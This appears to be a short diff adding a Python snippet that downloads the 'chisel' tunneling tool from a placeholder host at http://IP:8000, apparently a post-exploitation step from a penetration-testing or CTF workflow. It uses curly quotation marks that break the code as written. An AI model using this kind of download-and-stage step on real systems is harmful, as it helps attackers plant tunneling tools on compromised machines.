@@ -1,0 +1,4 @@
+python3
+import urllib.request
+url= ‘http://IP:8000/chisel'
+urllib.request.urlretrieve(url, “chisel”)
